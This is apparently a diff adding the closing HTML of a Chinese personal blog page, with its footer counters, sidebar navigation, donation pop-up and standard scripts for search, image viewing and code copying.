+  <span><i class="ri-eye-fill"></i>浏览次数:<span id="busuanzi_value_page_pv"></span></span>
+</span>
+        
+      </li>
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      
+    </ul>
+    <ul>
+      <li>
+        <!-- cnzz统计 -->
+        
+        <script type="text/javascript" src='https://s9.cnzz.com/z_stat.php?id=1278069914&amp;web_id=1278069914'></script>
+        
+      </li>
+    </ul>
+  </div>
+</footer>    
+    </main>
+    <div class="float_btns">
+      <div class="totop" id="totop">
+  <i class="ri-arrow-up-line"></i>
+</div>
+
+<div class="todark" id="todark">
+  <i class="ri-moon-line"></i>
+</div>
+
+    </div>
+    <aside class="sidebar on">
+      <button class="navbar-toggle"></button>
+<nav class="navbar">
+  
+  <div class="logo">
+    <a href="/"><img src="/favicon.ico" alt="小张之栈"></a>
+  </div>
+  
+  <ul class="nav nav-main">
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/">主页</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/archives">归档</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/categories">分类</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/tags">标签</a>
+    </li>
+    
+    <li class="nav-item">
+      <a class="nav-item-link" href="/about">关于我</a>
+    </li>
+    
+  </ul>
+</nav>
+<nav class="navbar navbar-bottom">
+  <ul class="nav">
+    <li class="nav-item">
+      
+      <a class="nav-item-link nav-item-search"  title="搜索">
+        <i class="ri-search-line"></i>
+      </a>
+      
+      
+    </li>
+  </ul>
+</nav>
+<div class="search-form-wrap">
+  <div class="local-search local-search-plugin">
+  <input type="search" id="local-search-input" class="local-search-input" placeholder="Search...">
+  <div id="local-search-result" class="local-search-result"></div>
+  <script type="text/javascript">
+$(function () {
+    console.log("lets go！");
+    console.log("/");
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+</div>
+
+</div>
+    </aside>
+    <div id="mask"></div>
+
+<!-- #reward -->
+<div id="reward">
+  <span class="close"><i class="ri-close-line"></i></span>
+  <p class="reward-p"><i class="ri-cup-line"></i>请我喝杯咖啡吧~</p>
+  <div class="reward-box">
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/alipay.jpg">
+      <span class="reward-type">支付宝</span>
+    </div>
+    
+    
+    <div class="reward-item">
+      <img class="reward-img" src="/images/wechat.jpg">
+      <span class="reward-type">微信</span>
+    </div>
+    
+  </div>
+</div>
+    
+<script src="/js/jquery-3.6.0.min.js"></script>
+ 
+<script src="/js/lazyload.min.js"></script>
+
+<!-- Tocbot -->
+ 
+<script src="/js/tocbot.min.js"></script>
+
+<script>
+  tocbot.init({
+    tocSelector: ".tocbot",
+    contentSelector: ".article-entry",
+    headingSelector: "h1, h2, h3, h4, h5, h6",
+    hasInnerContainers: true,
+    scrollSmooth: true,
+    scrollContainer: "main",
+    positionFixedSelector: ".tocbot",
+    positionFixedClass: "is-position-fixed",
+    fixedSidebarOffset: "auto",
+  });
+</script>
+
+<script src="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.js"></script>
+<link
+  rel="stylesheet"
+  href="https://cdn.staticfile.org/jquery-modal/0.9.2/jquery.modal.min.css"
+/>
+<script src="https://cdn.staticfile.org/justifiedGallery/3.8.1/js/jquery.justifiedGallery.min.js"></script>
+
+<script src="/dist/main.js"></script>
+
+<!-- ImageViewer -->
+ <!-- Root element of PhotoSwipe. Must have class pswp. -->
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    <!-- Background of PhotoSwipe. 
+         It's a separate element as animating opacity is faster than rgba(). -->
+    <div class="pswp__bg"></div>
+
+    <!-- Slides wrapper with overflow:hidden. -->
+    <div class="pswp__scroll-wrap">
+
+        <!-- Container that holds slides. 
+            PhotoSwipe keeps only 3 of them in the DOM to save memory.
+            Don't modify these 3 pswp__item elements, data is added later on. -->
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        <!-- Default (PhotoSwipeUI_Default) interface on top of sliding area. Can be changed. -->
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                <!--  Controls are self-explanatory. Order can be changed. -->
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" style="display:none" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                <!-- Preloader demo http://codepen.io/dimsemenov/pen/yyBWoR -->
+                <!-- element will get class pswp__preloader--active when preloader is running -->
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div>
+
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.css">
+<link rel="stylesheet" href="https://cdn.staticfile.org/photoswipe/4.1.3/default-skin/default-skin.min.css">
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe.min.js"></script>
+<script src="https://cdn.staticfile.org/photoswipe/4.1.3/photoswipe-ui-default.min.js"></script>
+
+<script>
+    function viewer_init() {
+        let pswpElement = document.querySelectorAll('.pswp')[0];
+        let $imgArr = document.querySelectorAll(('.article-entry img:not(.reward-img)'))
+
+        $imgArr.forEach(($em, i) => {
+            $em.onclick = () => {
+                // slider展开状态
+                // todo: 这样不好，后面改成状态
+                if (document.querySelector('.left-col.show')) return
+                let items = []
+                $imgArr.forEach(($em2, i2) => {
+                    let img = $em2.getAttribute('data-idx', i2)
+                    let src = $em2.getAttribute('data-target') || $em2.getAttribute('src')
+                    let title = $em2.getAttribute('alt')
+                    // 获得原图尺寸
+                    const image = new Image()
+                    image.src = src
+                    items.push({
+                        src: src,
+                        w: image.width || $em2.width,
+                        h: image.height || $em2.height,
+                        title: title
+                    })
+                })
+                var gallery = new PhotoSwipe(pswpElement, PhotoSwipeUI_Default, items, {
+                    index: parseInt(i)
+                });
+                gallery.init()
+            }
+        })
+    }
+    viewer_init()
+</script> 
+<!-- MathJax -->
+
+<!-- Katex -->
+
+<!-- busuanzi  -->
+ 
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+ 
+<!-- ClickLove -->
+
+<!-- ClickBoom1 -->
+
+<script src="https://cdn.staticfile.org/animejs/3.2.1/anime.min.js"></script>
+
+<script src="/js/clickBoom1.js"></script>
+ 
+<!-- ClickBoom2 -->
+
+<!-- CodeCopy -->
+ 
+<link rel="stylesheet" href="/css/clipboard.css">
+ <script src="https://cdn.staticfile.org/clipboard.js/2.0.10/clipboard.min.js"></script>
+<script>
+  function wait(callback, seconds) {
+    var timelag = null;
+    timelag = window.setTimeout(callback, seconds);
+  }
+  !function (e, t, a) {
+    var initCopyCode = function(){
+      var copyHtml = '';
+      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
+      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
+      copyHtml += '</button>';
+      $(".highlight .code pre").before(copyHtml);
+      $(".article pre code").before(copyHtml);
+      var clipboard = new ClipboardJS('.btn-copy', {
+        target: function(trigger) {
+          return trigger.nextElementSibling;
+        }
+      });
+      clipboard.on('success', function(e) {
+        let $btn = $(e.trigger);
+        $btn.addClass('copied');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-checkbox-circle-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPIED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-checkbox-circle-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+      clipboard.on('error', function(e) {
+        e.clearSelection();
+        let $btn = $(e.trigger);
+        $btn.addClass('copy-failed');
+        let $icon = $($btn.find('i'));
+        $icon.removeClass('ri-file-copy-2-line');
+        $icon.addClass('ri-time-line');
+        let $span = $($btn.find('span'));
+        $span[0].innerText = 'COPY FAILED';
+        
+        wait(function () { // 等待两秒钟后恢复
+          $icon.removeClass('ri-time-line');
+          $icon.addClass('ri-file-copy-2-line');
+          $span[0].innerText = 'COPY';
+        }, 2000);
+      });
+    }
+    initCopyCode();
+  }(window, document);
+</script>
+ 
+<!-- CanvasBackground -->
+ 
+<script src="/js/dz.js"></script>
+ 
+<script>
+  if (window.mermaid) {
+    mermaid.initialize({ theme: "forest" });
+  }
+</script>
+
+
+    
+    
+
+  </div>
+</body>
+
+</html>
